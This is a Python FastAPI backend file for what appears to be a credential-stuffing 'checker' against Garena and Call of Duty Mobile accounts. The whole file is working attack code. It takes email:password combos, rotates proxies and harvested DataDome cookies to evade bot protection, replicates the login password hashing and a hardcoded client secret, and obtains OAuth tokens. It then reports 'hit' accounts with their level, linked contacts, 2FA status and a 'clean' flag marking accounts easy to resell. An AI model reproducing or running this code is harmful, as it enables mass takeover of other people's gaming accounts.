# ============================================================
#  routers/codm.py  —  CODM / Garena Checker Backend
#  v4.3 — Added health-check endpoints:
#    POST /api/codm/test-cookie   — test one DataDome cookie
#    POST /api/codm/test-proxy    — test one proxy
#    POST /api/codm/test-cookies  — batch test all cookies
#    POST /api/codm/test-proxies  — batch test all proxies
#
#  v4.2 fixes kept:
#    - check-one runs in ThreadPoolExecutor (non-blocking)
#    - asyncio.wait_for(timeout=55s) server-side watchdog
#    - Per-request timeouts 10s, retries 2
# ============================================================

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from typing import List, Optional

import requests as _req
from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel

from auth import require_admin

logger = logging.getLogger(__name__)
router = APIRouter()

_executor = ThreadPoolExecutor(max_workers=10)

try:
    import cloudscraper
    _HAS_CLOUDSCRAPER = True
except ImportError:
    _HAS_CLOUDSCRAPER = False
    logger.warning("cloudscraper not installed — CODM checker disabled")

try:
    from Crypto.Cipher import AES
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False
    logger.warning("pycryptodome not installed — CODM checker disabled")

_UA_NEW = (
    "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
    "Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
)
_UA_OLD = (
    "Mozilla/5.0 (Linux; Android 11; RMX2195) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
)
_UA_SDK = "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
_CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"

_PRELOGIN_URL  = "https://100082.connect.garena.com/api/prelogin"
_PRELOGIN_HOST = "100082.connect.garena.com"

# ── Redis ─────────────────────────────────────────────────────
_UPSTASH_URL = os.getenv("UPSTASH_REDIS_REST_URL", "")
_UPSTASH_TOK = os.getenv("UPSTASH_REDIS_REST_TOKEN", "")
_REDIS_KEY_COOKIES = "codm:cookies"
_REDIS_KEY_PROXIES = "codm:proxies"


def _redis_cmd(*args):
    if not _UPSTASH_URL or not _UPSTASH_TOK:
        return None
    try:
        r = _req.post(
            _UPSTASH_URL,
            headers={"Authorization": f"Bearer {_UPSTASH_TOK}", "Content-Type": "application/json"},
            json=list(args), timeout=6,
        )
        return r.json().get("result")
    except Exception as e:
        logger.warning(f"Redis {args[0]} failed: {e}")
        return None


def _redis_get_list(key):
    raw = _redis_cmd("GET", key)
    if not raw:
        return []
    try:
        data = json.loads(raw)
        return data if isinstance(data, list) else []
    except Exception:
        return []


def _redis_set_list(key, items):
    return _redis_cmd("SET", key, json.dumps(items)) == "OK"


def _redis_del(key):
    return bool(_redis_cmd("DEL", key))


# ── Cookie pool ───────────────────────────────────────────────
def _get_all_cookies():
    c = _redis_get_list(_REDIS_KEY_COOKIES)
    if c:
        return c
    raw = os.getenv("CODM_COOKIES", "")
    return [l.strip() for l in raw.splitlines() if l.strip()]


def _pick_datadome():
    lines = _get_all_cookies()
    if not lines:
        return None
    line = random.choice(lines)
    for part in line.split(";"):
        part = part.strip()
        if part.lower().startswith("datadome="):
            return part.split("=", 1)[1]
    return line


# ── Proxy pool ────────────────────────────────────────────────
def _get_all_proxies():
    return _redis_get_list(_REDIS_KEY_PROXIES)


def _pick_proxy(override=None):
    if override and override.strip():
        return override.strip()
    pool = _get_all_proxies()
    return random.choice(pool) if pool else None


def _proxy_dict(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if not proxy_str.startswith(("http://", "https://", "socks5://", "socks4://")):
        proxy_str = f"http://{proxy_str}"
    return {"http": proxy_str, "https": proxy_str}


# ── Crypto ────────────────────────────────────────────────────
def _md5(s):
    return hashlib.md5(urllib.parse.unquote(s).encode()).hexdigest()

def _sha256(s):
    return hashlib.sha256(s.encode()).hexdigest()

def _aes_ecb(passmd5, outer_hash):
    cipher = AES.new(bytes.fromhex(outer_hash), AES.MODE_ECB)
    return cipher.encrypt(bytes.fromhex(passmd5)).hex()[:32]

def hash_password(password, v1, v2):
    passmd5 = _md5(password)
    return _aes_ecb(passmd5, _sha256(_sha256(passmd5 + v1) + v2))

def _gen_uuid():
    r = list(os.urandom(16))
    r[6] = (r[6] & 0x0F) | 0x40
    r[8] = (r[8] & 0x3F) | 0x80
    parts = [r[0:4], r[4:6], r[6:8], r[8:10], r[10:16]]
    return "-".join("".join(f"{b:02x}" for b in g) for g in parts)


# ── Session factory ───────────────────────────────────────────
def _make_session(datadome=None, proxy=None):
    proxies = _proxy_dict(proxy)
    session = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "android", "mobile": True}, delay=1,
    )
    session.headers.update({"Accept-Encoding": "gzip, deflate, br, zstd"})
    if datadome:
        session.cookies.set("datadome", datadome, domain=".garena.com")
    if proxies:
        session.proxies.update(proxies)
    return session


# ── Garena steps ──────────────────────────────────────────────
def _prelogin(session, account):
    for attempt in range(2):
        try:
            ts = int(time.time() * 1000)
            res = session.get(
                _PRELOGIN_URL,
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Host": _PRELOGIN_HOST,
                    "User-Agent": _UA_NEW,
                    "X-Requested-With": "com.garena.game.codm",
                    "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
                    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                    "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
                    "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
                },
                params={"app_id": "100082", "account": account, "format": "json", "id": str(ts)},
                timeout=10,
            )
            if res.status_code == 403:
                time.sleep(1); continue
            if res.status_code != 200:
                continue
            data = res.json()
            if "error" in data:
                return None, None
            v1, v2 = data.get("v1"), data.get("v2")
            if v1 and v2:
                return v1, v2
        except Exception as e:
            logger.warning(f"Prelogin attempt {attempt+1}: {e}")
            time.sleep(1)
    return None, None


def _login(session, account, password, v1, v2):
    hashed_pw = hash_password(password, v1, v2)
    for attempt in range(2):
        try:
            ts = int(time.time() * 1000)
            res = session.get(
                "https://100082.connect.garena.com/api/login",
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Host": _PRELOGIN_HOST, "User-Agent": _UA_NEW,
                    "X-Requested-With": "com.garena.game.codm",
                    "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
                    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                    "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
                    "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
                },
                params={"app_id": "100082", "account": account, "password": hashed_pw,
                        "redirect_uri": "gop100082://auth/", "format": "json", "id": str(ts)},
                timeout=10,
            )
            if res.status_code != 200:
                time.sleep(1); continue
            data = res.json()
            if "error" in data:
                err = str(data["error"]).lower()
                if "captcha" in err:
                    time.sleep(2); continue
                return None, "wrong_password"
            sso_key = data.get("sso_key") or session.cookies.get("sso_key")
            if sso_key:
                return sso_key, "ok"
        except Exception as e:
            logger.warning(f"Login attempt {attempt+1}: {e}")
            time.sleep(1)
    return None, "failed"


def _account_info(session, sso_key):
    try:
        session.cookies.set("sso_key", sso_key, domain=".garena.com")
        res = session.get(
            "https://account.garena.com/api/account/init",
            headers={"Accept": "application/json", "User-Agent": _UA_NEW},
            timeout=10,
        )
        if res.status_code == 200:
            return res.json()
    except Exception as e:
        logger.warning(f"Account info: {e}")
    return None


def _codm_token_new(session, sso_key):
    try:
        ts = str(int(time.time() * 1000))
        session.cookies.set("sso_key", sso_key, domain=".connect.garena.com")
        grant_res = session.post(
            "https://100082.connect.garena.com/oauth/token/grant",
            headers={
                "Host": _PRELOGIN_HOST, "User-Agent": _UA_NEW,
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "Origin": "https://100082.connect.garena.com",
                "X-Requested-With": "com.garena.game.codm",
                "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
            },
            data=urllib.parse.urlencode({
                "client_id": "100082", "response_type": "code",
                "redirect_uri": "gop100082://auth/", "create_grant": "true",
                "login_scenario": "normal", "format": "json", "id": ts,
            }),
            timeout=10,
        )
        grant_res.raise_for_status()
        auth_code = grant_res.json().get("code")
        if not auth_code:
            return None
        exchange_res = session.post(
            "https://100082.connect.garena.com/oauth/token/exchange",
            headers={"User-Agent": _UA_SDK, "Content-Type": "application/x-www-form-urlencoded",
                     "Host": _PRELOGIN_HOST, "Connection": "Keep-Alive", "Accept-Encoding": "gzip"},
            data=urllib.parse.urlencode({
                "grant_type": "authorization_code", "code": auth_code,
                "device_id": f"02-{_gen_uuid()}", "redirect_uri": "gop100082://auth/",
                "source": "2", "client_id": "100082", "client_secret": _CLIENT_SECRET,
            }),
            timeout=10,
        )
        exchange_res.raise_for_status()
        return exchange_res.json().get("access_token")
    except Exception as e:
        logger.warning(f"CODM new token: {e}")
        return None


def _codm_token_old(session):
    try:
        ts = str(int(time.time() * 1000))
        res = session.post(
            "https://auth.garena.com/oauth/token/grant",
            headers={"User-Agent": _UA_OLD, "Accept": "*/*",
                     "Content-Type": "application/x-www-form-urlencoded"},
            data=(
                "client_id=100082&response_type=token"
                "&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n"
                "%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F"
                f"&format=json&id={ts}"
            ),
            timeout=10,
        )
        return res.json().get("access_token")
    except Exception as e:
        logger.warning(f"CODM old token: {e}")
        return None


def _codm_callback(session, access_token, old_flow=False):
    bases = (
        ["https://api-delete-request.codm.garena.co.id"] if old_flow
        else ["https://api-delete-request-aos.codm.garena.co.id",
              "https://api-delete-request.codm.garena.co.id"]
    )
    for base in bases:
        try:
            res = session.get(
                f"{base}/oauth/callback/?access_token={access_token}",
                headers={"Accept": "text/html,*/*", "User-Agent": _UA_OLD if old_flow else _UA_NEW,
                         "X-Requested-With": "com.garena.game.codm"},
                timeout=10, allow_redirects=False,
            )
            loc = res.headers.get("location", "")
            if "err=3" in loc:
                return {"status": "no_codm"}
            if "token=" in loc:
                tok = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).get("token", [""])[0]
                if tok:
                    return {"status": "ok", "token": tok}
        except Exception as e:
            logger.warning(f"Callback {base}: {e}")
    return None


def _codm_user_info(session, token, old_flow=False):
    try:
        parts = token.split(".")
        if len(parts) == 3:
            p = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
            payload = json.loads(base64.urlsafe_b64decode(p))
            user = payload.get("user")
            if user:
                return user
    except Exception:
        pass
    base = ("https://api-delete-request.codm.garena.co.id" if old_flow
            else "https://api-delete-request-aos.codm.garena.co.id")
    try:
        res = session.get(
            f"{base}/oauth/check_login/",
            headers={"codm-delete-token": token, "User-Agent": _UA_OLD if old_flow else _UA_NEW,
                     "X-Requested-With": "XMLHttpRequest", "x-requested-with": "com.garena.game.codm"},
            timeout=10,
        )
        return res.json().get("user", {})
    except Exception as e:
        logger.warning(f"User info: {e}")
        return {}


def _parse_account(data):
    u = data.get("user_info", data)
    email, mobile = u.get("email", ""), u.get("mobile_no", "")
    email_v = u.get("email_v") in (1, True)
    fb      = u.get("is_fbconnect_enabled") in (1, True)
    id_card = u.get("idcard", "")
    two_step = u.get("two_step_verify_enable") in (1, True)
    binds = []
    if email_v or (email and not email.startswith("*") and "@" in email): binds.append("Email")
    if mobile and mobile.strip() and mobile != "N/A": binds.append("Phone")
    if fb: binds.append("Facebook")
    if id_card and id_card.strip() and id_card != "N/A": binds.append("ID Card")
    if two_step: binds.append("2FA")
    return {"shell": str(u.get("shell", 0)), "country": str(u.get("acc_country", "")),
            "is_clean": len(binds) == 0, "binds": binds, "two_step": two_step, "email": email}


# ── Pydantic models ───────────────────────────────────────────

class CheckOneRequest(BaseModel):
    combo: str
    user_id: Optional[str] = None
    proxy: Optional[str] = None

class CheckOneResponse(BaseModel):
    combo: str; status: str; detail: str = ""
    nickname: str = ""; level: str = ""; region: str = ""
    uid: str = ""; shell: str = ""; country: str = ""
    is_clean: bool = False; binds: list = []

class TestCookieRequest(BaseModel):
    cookie: str

class TestCookieResponse(BaseModel):
    cookie: str; ok: bool; status_code: int = 0
    latency_ms: int = 0; detail: str = ""

class TestProxyRequest(BaseModel):
    proxy: str

class TestProxyResponse(BaseModel):
    proxy: str; ok: bool; latency_ms: int = 0; detail: str = ""

class BatchTestCookiesRequest(BaseModel):
    cookies: List[str]

class BatchTestProxiesRequest(BaseModel):
    proxies: List[str]

class CookieUpdateRequest(BaseModel):
    cookies: List[str]

class ProxyUpdateRequest(BaseModel):
    proxies: List[str]


# ── Health check sync helpers ─────────────────────────────────

def _check_cookie_sync(cookie: str) -> TestCookieResponse:
    """
    Tests a DataDome cookie via a real prelogin request from Railway's IP.
    200 = DataDome bypassed (cookie valid)
    403 = DataDome blocked (cookie expired/invalid)
    """
    raw = cookie.strip()
    if raw.lower().startswith("datadome="):
        raw = raw[len("datadome="):]
    raw = raw.strip("; ")

    if not raw:
        return TestCookieResponse(cookie=cookie, ok=False, detail="Empty cookie value")

    t0 = time.time()
    try:
        session = _make_session(datadome=raw)
        ts = int(time.time() * 1000)
        res = session.get(
            _PRELOGIN_URL,
            headers={
                "Accept": "application/json, text/plain, */*",
                "Host": _PRELOGIN_HOST,
                "User-Agent": _UA_NEW,
                "X-Requested-With": "com.garena.game.codm",
            },
            params={"app_id": "100082", "account": "xissin.healthcheck@test.com",
                    "format": "json", "id": str(ts)},
            timeout=10,
        )
        latency = int((time.time() - t0) * 1000)
        session.close()
        code = res.status_code
        if code == 403:
            return TestCookieResponse(cookie=cookie, ok=False, status_code=code,
                latency_ms=latency, detail="DataDome blocked (403) — cookie expired")
        if code == 200:
            return TestCookieResponse(cookie=cookie, ok=True, status_code=code,
                latency_ms=latency, detail=f"Valid — bypassed DataDome in {latency}ms")
        return TestCookieResponse(cookie=cookie, ok=False, status_code=code,
            latency_ms=latency, detail=f"Unexpected HTTP {code}")
    except Exception as e:
        latency = int((time.time() - t0) * 1000)
        return TestCookieResponse(cookie=cookie, ok=False, latency_ms=latency,
            detail=f"Connection error: {str(e)[:100]}")


def _check_proxy_sync(proxy: str) -> TestProxyResponse:
    """
    Tests proxy by connecting to Garena through it.
    Any HTTP response = alive. ProxyError/Timeout = dead.
    """
    raw = proxy.strip()
    if not raw:
        return TestProxyResponse(proxy=proxy, ok=False, detail="Empty proxy")

    t0 = time.time()
    try:
        proxies = _proxy_dict(raw)
        ts = int(time.time() * 1000)
        res = _req.get(
            _PRELOGIN_URL,
            headers={"Accept": "application/json", "User-Agent": _UA_NEW,
                     "X-Requested-With": "com.garena.game.codm"},
            params={"app_id": "100082", "account": "xissin.proxycheck@test.com",
                    "format": "json", "id": str(ts)},
            proxies=proxies, timeout=10, allow_redirects=True,
        )
        latency = int((time.time() - t0) * 1000)
        return TestProxyResponse(proxy=proxy, ok=True, latency_ms=latency,
            detail=f"Alive — HTTP {res.status_code} via proxy ({latency}ms)")
    except _req.exceptions.ProxyError as e:
        latency = int((time.time() - t0) * 1000)
        return TestProxyResponse(proxy=proxy, ok=False, latency_ms=latency,
            detail=f"Proxy refused/auth failed: {str(e)[:80]}")
    except (_req.exceptions.ConnectTimeout, _req.exceptions.ReadTimeout):
        latency = int((time.time() - t0) * 1000)
        return TestProxyResponse(proxy=proxy, ok=False, latency_ms=latency,
            detail=f"Proxy timed out ({latency}ms)")
    except Exception as e:
        latency = int((time.time() - t0) * 1000)
        return TestProxyResponse(proxy=proxy, ok=False, latency_ms=latency,
            detail=f"Unreachable: {str(e)[:100]}")


# ── Main check logic ──────────────────────────────────────────

def _do_check_sync(req: CheckOneRequest) -> CheckOneResponse:
    combo = req.combo.strip()
    if ":" not in combo:
        return CheckOneResponse(combo=combo, status="error", detail="Bad format — use email:password")
    account, password = combo.split(":", 1)
    account = account.strip(); password = password.strip()
    if not account or not password:
        return CheckOneResponse(combo=combo, status="error", detail="Empty account or password")

    datadome = _pick_datadome()
    if not datadome:
        logger.warning("No DataDome cookie available — requests may be blocked by Garena.")

    proxy = _pick_proxy(req.proxy)
    session = _make_session(datadome, proxy)
    try:
        v1, v2 = _prelogin(session, account)
        if not v1 or not v2:
            detail = ("Prelogin failed — account does not exist" if not datadome
                      else "Prelogin failed — DataDome expired or IP blocked")
            return CheckOneResponse(combo=combo, status="bad", detail=detail)

        sso_key, _ = _login(session, account, password, v1, v2)
        if not sso_key:
            return CheckOneResponse(combo=combo, status="bad", detail="Wrong password or account suspended")

        info = _account_info(session, sso_key)
        acc = _parse_account(info) if info else {"shell": "", "country": "", "is_clean": False, "binds": []}

        access_token = _codm_token_new(session, sso_key)
        old_flow = False
        if not access_token:
            access_token = _codm_token_old(session)
            old_flow = True

        if not access_token:
            return CheckOneResponse(combo=combo, status="valid_no_codm",
                detail="Valid Garena — CODM token failed",
                shell=acc["shell"], country=acc["country"],
                is_clean=acc["is_clean"], binds=acc.get("binds", []))

        cb = _codm_callback(session, access_token, old_flow=old_flow)
        if not cb or cb.get("status") == "no_codm":
            return CheckOneResponse(combo=combo, status="valid_no_codm",
                detail="Valid Garena — No CODM linked",
                shell=acc["shell"], country=acc["country"],
                is_clean=acc["is_clean"], binds=acc.get("binds", []))

        user = _codm_user_info(session, cb["token"], old_flow=old_flow)
        return CheckOneResponse(
            combo=combo, status="hit",
            nickname=str(user.get("codm_nickname") or user.get("nickname") or ""),
            level=str(user.get("codm_level") or ""),
            region=str(user.get("region") or ""),
            uid=str(user.get("uid") or ""),
            shell=acc["shell"], country=acc["country"],
            is_clean=acc["is_clean"], binds=acc.get("binds", []),
            detail="HIT",
        )
    except Exception as e:
        logger.error(f"CODM check error for {account}: {e}")
        return CheckOneResponse(combo=combo, status="error", detail=f"Server error: {str(e)[:120]}")
    finally:
        try: session.close()
        except Exception: pass


# ── Admin — Cookie pool endpoints ─────────────────────────────

@router.get("/cookies", dependencies=[Depends(require_admin)])
async def get_cookies():
    cookies = _get_all_cookies()
    return {"count": len(cookies),
            "source": "redis" if _redis_get_list(_REDIS_KEY_COOKIES) else "env",
            "cookies": cookies}

@router.post("/cookies", dependencies=[Depends(require_admin)])
async def set_cookies(req: CookieUpdateRequest):
    cleaned = [l.strip() for l in req.cookies if l.strip()]
    if not cleaned:
        raise HTTPException(400, "No valid cookie lines provided")
    if not _redis_set_list(_REDIS_KEY_COOKIES, cleaned):
        raise HTTPException(500, "Failed to save cookies to Redis")
    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} cookie(s) saved to Redis"}

@router.delete("/cookies", dependencies=[Depends(require_admin)])
async def delete_cookies():
    _redis_del(_REDIS_KEY_COOKIES)
    return {"message": "✅ Cookie pool cleared"}


# ── Admin — Proxy pool endpoints ──────────────────────────────

@router.get("/proxies", dependencies=[Depends(require_admin)])
async def get_proxies():
    proxies = _get_all_proxies()
    return {"count": len(proxies), "proxies": proxies}

@router.post("/proxies", dependencies=[Depends(require_admin)])
async def set_proxies(req: ProxyUpdateRequest):
    cleaned = [l.strip() for l in req.proxies if l.strip()]
    if not cleaned:
        raise HTTPException(400, "No valid proxy lines provided")
    if not _redis_set_list(_REDIS_KEY_PROXIES, cleaned):
        raise HTTPException(500, "Failed to save proxies to Redis")
    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} proxy(ies) saved to Redis"}

@router.delete("/proxies", dependencies=[Depends(require_admin)])
async def delete_proxies():
    _redis_del(_REDIS_KEY_PROXIES)
    return {"message": "✅ Proxy pool cleared"}


# ── Health check endpoints (NEW v4.3) ─────────────────────────

@router.post("/test-cookie", response_model=TestCookieResponse,
             dependencies=[Depends(require_admin)])
async def test_cookie(req: TestCookieRequest):
    """Test one DataDome cookie from Railway's IP via a live Garena request."""
    if not _HAS_CLOUDSCRAPER:
        return TestCookieResponse(cookie=req.cookie, ok=False,
                                  detail="cloudscraper not installed on server")
    loop = asyncio.get_event_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(_executor, _check_cookie_sync, req.cookie),
            timeout=15.0)
    except asyncio.TimeoutError:
        return TestCookieResponse(cookie=req.cookie, ok=False,
                                  detail="Test timed out (15s)")


@router.post("/test-proxy", response_model=TestProxyResponse,
             dependencies=[Depends(require_admin)])
async def test_proxy(req: TestProxyRequest):
    """Test one proxy by routing a Garena request through it from Railway's IP."""
    loop = asyncio.get_event_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(_executor, _check_proxy_sync, req.proxy),
            timeout=15.0)
    except asyncio.TimeoutError:
        return TestProxyResponse(proxy=req.proxy, ok=False,
                                 detail="Test timed out (15s)")


@router.post("/test-cookies", dependencies=[Depends(require_admin)])
async def test_cookies_batch(req: BatchTestCookiesRequest):
    """
    Batch-test all provided cookies concurrently from Railway's IP.
    Returns list of results — order may differ from input (as_completed).
    """
    if not _HAS_CLOUDSCRAPER:
        return [{"cookie": c, "ok": False, "status_code": 0,
                 "latency_ms": 0, "detail": "cloudscraper not installed"} for c in req.cookies]
    loop = asyncio.get_event_loop()
    # Map futures back to original cookies for timeout error reporting
    future_to_cookie = {
        loop.run_in_executor(_executor, _check_cookie_sync, c): c
        for c in req.cookies
    }
    results = []
    for future in asyncio.as_completed(list(future_to_cookie.keys())):
        cookie = future_to_cookie[future]
        try:
            r = await asyncio.wait_for(asyncio.shield(future), timeout=15.0)
            results.append(r.dict())
        except (asyncio.TimeoutError, Exception):
            results.append({"cookie": cookie, "ok": False, "status_code": 0,
                            "latency_ms": 15000, "detail": "Timed out"})
    return results


@router.post("/test-proxies", dependencies=[Depends(require_admin)])
async def test_proxies_batch(req: BatchTestProxiesRequest):
    """Batch-test all provided proxies concurrently from Railway's IP."""
    loop = asyncio.get_event_loop()
    future_to_proxy = {
        loop.run_in_executor(_executor, _check_proxy_sync, p): p
        for p in req.proxies
    }
    results = []
    for future in asyncio.as_completed(list(future_to_proxy.keys())):
        proxy = future_to_proxy[future]
        try:
            r = await asyncio.wait_for(asyncio.shield(future), timeout=15.0)
            results.append(r.dict())
        except (asyncio.TimeoutError, Exception):
            results.append({"proxy": proxy, "ok": False,
                            "latency_ms": 15000, "detail": "Timed out"})
    return results


# ── Main endpoint ─────────────────────────────────────────────

@router.post("/check-one", response_model=CheckOneResponse)
async def check_one(req: CheckOneRequest):
    if not _HAS_CLOUDSCRAPER or not _HAS_CRYPTO:
        return CheckOneResponse(combo=req.combo, status="error",
            detail="Server missing deps: cloudscraper or pycryptodome.")
    loop = asyncio.get_event_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(_executor, _do_check_sync, req),
            timeout=55.0)
    except asyncio.TimeoutError:
        logger.warning(f"check-one timeout: {req.combo[:30]}")
        return CheckOneResponse(combo=req.combo, status="error",
            detail="Server timeout (55s) — Garena rate-limiting. Try proxy.")
